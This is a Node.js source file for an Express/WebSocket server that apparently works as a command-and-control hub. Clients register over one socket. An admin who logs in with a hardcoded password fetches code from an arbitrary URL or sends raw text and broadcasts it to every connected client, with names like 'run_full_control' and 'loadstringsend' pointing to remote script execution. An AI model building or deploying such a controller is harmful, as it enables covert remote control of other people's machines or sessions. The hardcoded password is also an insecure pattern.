const express = require("express");
const uuid = require("uuid");
const readline = require('readline');
const path = require("path");
const fs = require("fs");
const axios = require("axios");
const chalk = require("chalk");

const app = express();
const port = process.env.PORT || 3000;
const expressWs = require('express-ws')(app);
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const exportFCF = [];
const sendingmodule = {};
var rfc_logs = false;
var currentadminwebsocket = null;

function IsJsonString(str) {
    try {
        JSON.parse(str);
    } catch (e) {
        return false;
    };
    return JSON.parse(str);
};

app.get("/",(req, res) => {
    res.send("Hello World");
});

app.get("/version-get",(req, res) => {
    res.send("1.1.5 (beta)");
});

app.ws("/full-control-function",(ws, req) => {
    const RandomUUIDv4 = uuid.v4();
    exportFCF[RandomUUIDv4] = ws;
    ws.on("close",() => {
        delete exportFCF[RandomUUIDv4];
    });
});

app.ws("/administer-control-login",(ws, req) => {
    if (currentadminwebsocket === null) {
        var isadminister = false;
        var nextoneisrawfile = false;
        ws.send("ready-to-login");
        ws.on("message", (msg) => {
            if (isadminister === true){
                str = msg.toString();
                if (str.trim().length > 0) {
                    if (IsJsonString(str)) {
                        var JSONDat = IsJsonString(str);
                        if (JSONDat.type === "create-new-request-session") {
                            if (JSONDat.uuid === null) {
                                ws.send('error-incorrect-json');
                            } else {
                                nextoneisrawfile = true;
                            };
                        } else if (JSONDat.type === "sending-url") {
                            if (JSONDat.url === null) {
                                ws.send('error-incorrect-json');
                            } else {
                                axios.get(JSONDat.url).then((res) => {
                                    sendingmodule.rfc(res.data);
                                }).catch((err) => {
                                    sendingmodule.message(chalk.red("Error Log ,\n" + err));
                                    sendingmodule.message(JSON.stringify({"type":"can-wrote-cli"}));
                                });
                            };
                        } else if (JSONDat.type === "showing-all") {
                            sendingmodule.lsacc();
                        } else if (JSONDat.type === "show-log") {
                            sendingmodule.rfclogs(JSONDat.isshow);
                        } else if (JSONDat.type === "help") {
                            sendingmodule.help();
                        } else if (JSONDat.type === "exit") {
                            sendingmodule.exit();
                        } else {
                            sendingmodule.message(`Not Found "${str.trim()}" In CLI,\nUse "help" to see all available commands`);
                        };
                    } else if (nextoneisrawfile === true) {
                        nextoneisrawfile = false;
                        sendingmodule.rfc(str);
                    };
                    if (str.trim().toLowerCase().split(" ")[0] == "server-cut-off") {
                    };
                    /*
                    if (str.trim().toLowerCase().split(" ")[0] == "exit") {
                        sendingmodule.exit();
                    } else if (str.trim().toLowerCase().split(" ")[0] == "help") {
                        sendingmodule.help();
                    } else if (str.trim().toLowerCase().split(" ")[0] == "run_full_control") {
                        if (str.trim().toLowerCase().split(" ")[2] === undefined || str.trim().toLowerCase().split(" ")[2] !== "http_raw") {
                            if (str.trim().split(" ")[1] !== "" && str.trim().split(" ")[1] !== undefined && fs.existsSync(__dirname + "/" + str.trim().split(" ")[1])) {
                                sendingmodule.rfc(fs.readFileSync(path.join(__dirname + "/" + str.trim().split(" ")[1]),{encoding:'utf8'}));
                            }else{
                                sendingmodule.message("Incorrect path");
                            };
                        }else{
                            axios.get(str.trim().split(" ")[1]).then((res) => {
                                sendingmodule.rfc(res.data);
                            }).catch((err) => {
                                sendingmodule.message("Error Log,");
                                sendingmodule.message(err);
                            });
                        };
                    } else if (str.trim().toLowerCase().split(" ")[0] == "rfc_logs") {
                        sendingmodule.rfclogs(str.trim().split(" ")[1]);
                    } else if (str.trim().toLowerCase().split(" ")[0] == "connect_clients_logs") {
                        sendingmodule.lsacc();
                    } else {
                        sendingmodule.message(`Not Found "${str.trim()}" In CLI,\nUse "help" to see all available commands`);
                    };
                    */
                };
            } else {
                if(msg === "hackking3089"){
                    currentadminwebsocket = ws;
                    isadminister = true;
                    ws.send("welcome-administer");
                } else {
                    ws.send("wrong-password");
                };
            };
        });
        ws.on("close", () => {
            currentadminwebsocket = null;
        });
    } else {
        ws.send("already-have-login");
    };
});

sendingmodule.message = (msg) => {
    if (currentadminwebsocket !== null) {
        currentadminwebsocket.send(msg);
    }
};

sendingmodule.rfc = (loadstringsend) => {
    sendingmodule.message(chalk.magenta.underline("Sending command to all connected clients..."));
    Object.keys(exportFCF).forEach((UUIDv4) => {
        if (rfc_logs) {
            sendingmodule.message(chalk.cyan.underline("Sending command to client: " + UUIDv4));
        };
        exportFCF[UUIDv4].send(loadstringsend);
    });
    sendingmodule.message(JSON.stringify({"type":"can-wrote-cli"}));
};

sendingmodule.rfclogs = () => {
    if (rfc_logs === false) {
        sendingmodule.message(chalk.magenta.underline("now message will showing"));
        rfc_logs = true;
    } else if (rfc_logs === true) {
        sendingmodule.message(chalk.magenta.underline("now message will not showing"));
        rfc_logs = false;
    };
    sendingmodule.message(JSON.stringify({"type":"can-wrote-cli"}));
};

sendingmodule.lsacc = () => {
    sendingmodule.message(chalk.cyan("Showing all connected clients..."));
    Object.keys(exportFCF).forEach((UUIDv4) => {
        sendingmodule.message(chalk.cyan.underline("Logs client: " + UUIDv4));
    });
    sendingmodule.message(JSON.stringify({"type":"can-wrote-cli"}));
};

sendingmodule.help = () => {
    sendingmodule.message("Available commands:");
    sendingmodule.message("    run_full_control       -  send command to all current connect to ws");
    sendingmodule.message("    connect_clients_logs   -  logs all clients connected");
    sendingmodule.message("    rfc_logs               -  When send logs to clients will show in console (Default: false)");
    sendingmodule.message("    help                   -  show all available commands");
    sendingmodule.message("    exit                   -  exit the node js");
    sendingmodule.message(JSON.stringify({"type":"can-wrote-cli"}));
};

sendingmodule.exit = () => {
    process.exit(0);
};

app.listen(port,() => {
    console.log("Server is running on port " + port);
});